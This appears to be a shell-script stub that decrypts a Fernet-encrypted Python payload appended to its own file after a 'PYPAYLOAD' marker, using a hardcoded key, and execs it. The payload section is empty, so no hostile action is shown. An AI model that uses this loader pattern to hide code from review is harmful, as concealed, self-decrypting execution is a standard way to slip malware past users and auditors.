#!/bin/sh
_f="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
exec python3 -c 'import sys,os,base64
from cryptography.fernet import Fernet as _F
_k=base64.b64decode(b"X3N2X2tTTmJYTlV5MWlULUZSZHZDcnBHVUxoTlA3bDdOaVM1VGc1cm01dz0=")
_f=sys.argv[1]
with open(_f,"rb") as _fh: _raw=_fh.read()
_sep=b"\nPYPAYLOAD\n"
_enc=base64.b64decode(_raw[_raw.index(_sep)+len(_sep):].strip())
_src=_F(_k).decrypt(_enc)
_g={"__name__":"__main__","__file__":_f,"__spec__":None}
exec(compile(_src,_f,"exec"),_g)
' "$_f"
PYPAYLOAD

